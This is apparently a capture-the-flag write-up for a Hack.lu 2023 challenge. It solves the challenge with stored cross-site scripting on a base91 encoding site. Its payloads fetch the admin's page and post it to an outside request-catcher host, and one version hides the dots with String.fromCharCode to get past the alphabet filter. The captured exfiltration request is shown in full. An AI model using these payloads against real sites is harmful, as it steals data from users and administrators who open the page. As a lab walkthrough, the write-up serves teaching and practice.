# Based Encoding

CTF: [Hack.lu CTF 2023](https://flu.xxx/)

Difficulty: Medium

> Based encoding as a service. But can we insert a little tomfoolery? Let's find out.
> 

Link: [https://based.skin](https://based.skin/)

Files: BASED.zip

When we open the link we are prompted to this website, where we can register or login.

![Screenshot from 2023-10-16 23-14-41.png](Based%20Encoding%203360ae1b4858423483a4fa25b0de96de/Screenshot_from_2023-10-16_23-14-41.png)

![Screenshot from 2023-10-16 23-14-51.png](Based%20Encoding%203360ae1b4858423483a4fa25b0de96de/Screenshot_from_2023-10-16_23-14-51.png)

After signing up and login in as a normal user we can go to the /create page, in which we can write something, the website will encrypt it and save it in its database.

![Screenshot from 2023-10-16 23-15-16.png](Based%20Encoding%203360ae1b4858423483a4fa25b0de96de/Screenshot_from_2023-10-16_23-15-16.png)

![Screenshot from 2023-10-16 23-15-26.png](Based%20Encoding%203360ae1b4858423483a4fa25b0de96de/Screenshot_from_2023-10-16_23-15-26.png)

In the provided .zip file we can see how both the encoding and decoding are implemented. It is a base91 encryption and here is the alphabet used:

```python
import struct

base91_alphabet = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
	'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
	'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
	'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '!', '#', '$',
	'%', '€', '(', ')', '*', '+', ',', '°', '/', ':', ';', '<', '=',
	'>', '?', '@', '[', ']', '^', '_', '`', '{', '|', '}', '~', '"']

decode_table = dict((v,k) for k,v in enumerate(base91_alphabet))

def decode(encoded_str): ...
def encode(bindata): ...
```

We can go to the main page to check our encodings (each encoding has its own ID).

![Screenshot from 2023-10-16 23-15-34.png](Based%20Encoding%203360ae1b4858423483a4fa25b0de96de/Screenshot_from_2023-10-16_23-15-34.png)

Last thing we can do is reporting an encoding to the admin by passing the ID.

![Screenshot from 2023-10-16 23-15-56.png](Based%20Encoding%203360ae1b4858423483a4fa25b0de96de/Screenshot_from_2023-10-16_23-15-56.png)

First thing that came to my mind, especially after reading the note on top of the page “an admin going there”, is that we might be able to steal some credentials by performing an XSS. Let’s check if the website is vulnerable.

![Screenshot from 2023-10-16 23-56-09.png](Based%20Encoding%203360ae1b4858423483a4fa25b0de96de/Screenshot_from_2023-10-16_23-56-09.png)

After be sure that the encoding works fine we input the XSS payload and see how the website behaves.

![Screenshot from 2023-10-16 23-33-25.png](Based%20Encoding%203360ae1b4858423483a4fa25b0de96de/Screenshot_from_2023-10-16_23-33-25.png)

![Screenshot from 2023-10-16 23-33-31.png](Based%20Encoding%203360ae1b4858423483a4fa25b0de96de/Screenshot_from_2023-10-16_23-33-31.png)

The XSS has been triggered, the website is vulnerable! 

Before crafting the payload we need to notice that the base91 alphabet doesn’t accept some characters such as “.”. In order to fetch the admin data we need a payload like this:

```python
to_enc_string = '<script>\
fetch("/")\
    .then(x => x.text())\
    .then(x => fetch("https://nice.requestcatcher.com/test", {\
        method: "post",\
        body: x\
    }))\
</script>ciao'
```

Let’s avoid using the dots by accessing the functions using square brackets and obfuscating them by concatenating `String.fromCharCode(46)`. This is our payload in plaintext:

```python
to_enc_string = '<script>\
fetch("/")\
    ["then"](x => x["text"]())\
    ["then"](x => fetch("https://nice"+String["fromCharCode"](46)+"requestcatcher"+String["fromCharCode"](46)+"com/test", {\
        method: "post",\
        body: x\
    }))\
</script>ciao'
```

![Screenshot from 2023-10-17 00-11-03.png](Based%20Encoding%203360ae1b4858423483a4fa25b0de96de/Screenshot_from_2023-10-17_00-11-03.png)

Let’s send the payload in the /create page.

Now, in order to trigger the XSS we need to let an admin open the page, so we report the ID whose document contains the malicious js and wait for a response in the request catcher.

This is what I got:

```jsx
POST /test HTTP/1.1

Host: nice.requestcatcher.com

Accept: */*

Accept-Encoding: gzip, deflate, br

Connection: keep-alive

Content-Length: 1586

Content-Type: text/plain;charset=UTF-8

Origin: https://based.skin

Referer: https://based.skin/

Sec-Ch-Ua: "HeadlessChrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: "Linux"

Sec-Fetch-Dest: empty

Sec-Fetch-Mode: cors

Sec-Fetch-Site: cross-site

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.62 Safari/537.36

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Based Sharing</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.1/css/bulma.min.css">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style type="text/css" media="screen">
    html,body {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    body>footer {
      margin-top: auto;
    }
  </style>
</head>
<header>
  <nav class="navbar" role="navigation" aria-label="main navigation">
    <div class="navbar-brand">
      <a role="button" class="navbar-burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
        <span aria-hidden="true"></span>
        <span aria-hidden="true"></span>
        <span aria-hidden="true"></span>
      </a>
    </div>
    <div id="navbar" class="navbar-menu">
      <div class="navbar-start">
        <a class="navbar-item" href="/">
          Base
        </a>
        <a class="navbar-item" href="/create">
          Create
        </a>
        <hr class="navbar-divider">
        <a class="navbar-item" href="/report">
          Report
        </a>
      </div>
    </div>
    

  </nav>
</header>

<body>
  <div id="content">
    <center>
      
    
<center>
	<section class="section">
		<div class="container">
			<h1 class="title">Welcome to Based Encoding</h1>
			
			<div class="container" id="based">
				<a href="/e/3caf4d9b6351ca4cb471f06c513b1a69e526f6df">3caf4d9b6351ca4cb471f06c513b1a69e526f6df</a>
			</div>
			
</div>
</section>
</center>

  </div>
</body>
```

Let’s open the link it is referencing and… Here’s the flag!

![Screenshot from 2023-10-17 00-16-42.png](Based%20Encoding%203360ae1b4858423483a4fa25b0de96de/Screenshot_from_2023-10-17_00-16-42.png)